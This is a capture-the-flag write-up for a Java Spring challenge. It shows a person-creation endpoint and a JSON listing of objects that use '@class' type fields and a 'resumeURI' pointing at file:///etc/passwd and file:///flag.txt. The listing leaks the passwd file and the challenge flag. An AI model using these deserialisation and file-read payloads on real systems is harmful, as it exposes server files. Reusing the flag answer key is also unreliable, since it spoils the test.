# Challenge description

/

# Soluce

When we open the website, there is a 404 error. We can look at website source code. If we open "PersonController.java", we can see there is the following code:

```java
@RestController
@RequestMapping("/api/person")
public class PersonController {

    private List<Person> persons = new ArrayList<>();

    @PostMapping
    public String createPerson(@RequestBody Person person) {
        if (person.getAddress() == null) {
            throw new IllegalArgumentException("Address is required");
        }
        if (person.getJob() != null) {
            try {
                person.getJob().init();
            } catch (IOException e) {
                throw new RuntimeException("Error", e);
            }
        }
        persons.add(person);
        return "Person has been created with ID: " + person.getId();
    }

    @GetMapping
    public List<Person> getAllPersons() {
        return persons;
    }

    @GetMapping("/{id}")
    public Person getPersonById(@PathVariable UUID id) {
        Optional<Person> person = persons.stream().filter(p -> p.getId().equals(id)).findFirst();
        if (person.isPresent()) {
            return person.get();
        } else {
            throw new RuntimeException("Person not found with ID: " + id);
        }
    }
}
```

We will call the endpoint "/api/person" with a GET request.

```json
[
  "java.util.ArrayList",
  [
    {
      "@class": "com.serialies.serialies.Person",
      "id": "ca944c20-804e-45ed-830f-49726ce3c506",
      "name": "attacker",
      "age": 30,
      "address": {
        "@class": "com.serialies.serialies.Address",
        "street": "123 Exploit St",
        "city": "Hackerville",
        "state": "EV",
        "zipCode": "1337"
      },
      "job": {
        "@class": "com.serialies.serialies.Job",
        "title": "Hacker",
        "company": "EvilCorp",
        "salary": 999999,
        "resume": "root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\nsync:x:4:65534:sync:/bin:/bin/sync\ngames:x:5:60:games:/usr/games:/usr/sbin/nologin\nman:x:6:12:man:/var/cache/man:/usr/sbin/nologin\nlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\nmail:x:8:8:mail:/var/mail:/usr/sbin/nologin\nnews:x:9:9:news:/var/spool/news:/usr/sbin/nologin\nuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\nproxy:x:13:13:proxy:/bin:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nbackup:x:34:34:backup:/var/backups:/usr/sbin/nologin\nlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\nirc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin\ngnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin\nnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\n_apt:x:100:65534::/nonexistent:/usr/sbin/nologin\n",
        "resumeURI": "file:///etc/passwd"
      }
    },
    {
      "@class": "com.serialies.serialies.Person",
      "id": "7c1cd525-f96d-4555-9f01-0d868261d268",
      "name": "attacker",
      "age": 30,
      "address": {
        "@class": "com.serialies.serialies.Address",
        "street": "123 Exploit St",
        "city": "Hackerville",
        "state": "EV",
        "zipCode": "1337"
      },
      "job": {
        "@class": "com.serialies.serialies.Job",
        "title": "Hacker",
        "company": "EvilCorp",
        "salary": 999999,
        "resume": "root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\nsync:x:4:65534:sync:/bin:/bin/sync\ngames:x:5:60:games:/usr/games:/usr/sbin/nologin\nman:x:6:12:man:/var/cache/man:/usr/sbin/nologin\nlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\nmail:x:8:8:mail:/var/mail:/usr/sbin/nologin\nnews:x:9:9:news:/var/spool/news:/usr/sbin/nologin\nuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\nproxy:x:13:13:proxy:/bin:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nbackup:x:34:34:backup:/var/backups:/usr/sbin/nologin\nlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\nirc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin\ngnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin\nnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\n_apt:x:100:65534::/nonexistent:/usr/sbin/nologin\n",
        "resumeURI": "file:///etc/passwd"
      }
    },
    {
      "@class": "com.serialies.serialies.Person",
      "id": "eabd7e61-ba73-4839-9df4-1e07d207ac46",
      "name": "attacker",
      "age": 30,
      "address": {
        "@class": "com.serialies.serialies.Address",
        "street": "123 Exploit St",
        "city": "Hackerville",
        "state": "EV",
        "zipCode": null
      },
      "job": {
        "@class": "com.serialies.serialies.Job",
        "title": "Hacker",
        "company": "EvilCorp",
        "salary": 999999,
        "resume": "root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\nsync:x:4:65534:sync:/bin:/bin/sync\ngames:x:5:60:games:/usr/games:/usr/sbin/nologin\nman:x:6:12:man:/var/cache/man:/usr/sbin/nologin\nlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\nmail:x:8:8:mail:/var/mail:/usr/sbin/nologin\nnews:x:9:9:news:/var/spool/news:/usr/sbin/nologin\nuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\nproxy:x:13:13:proxy:/bin:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nbackup:x:34:34:backup:/var/backups:/usr/sbin/nologin\nlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\nirc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin\ngnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin\nnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\n_apt:x:100:65534::/nonexistent:/usr/sbin/nologin\n",
        "resumeURI": "file:///etc/passwd"
      }
    },
    [...]
    {
      "job": {
        "@class": "com.serialies.serialies.Job",
        "title": null,
        "company": null,
        "salary": 0,
        "resume": "swampCTF{f1l3_r34d_4nd_d3s3r14l1z3_pwn4g3_x7q9z2r5v8}",
        "resumeURI": "file:///flag.txt"
      }
    }
  ]
]
```

So the flag is `swampCTF{f1l3_r34d_4nd_d3s3r14l1z3_pwn4g3_x7q9z2r5v8}`.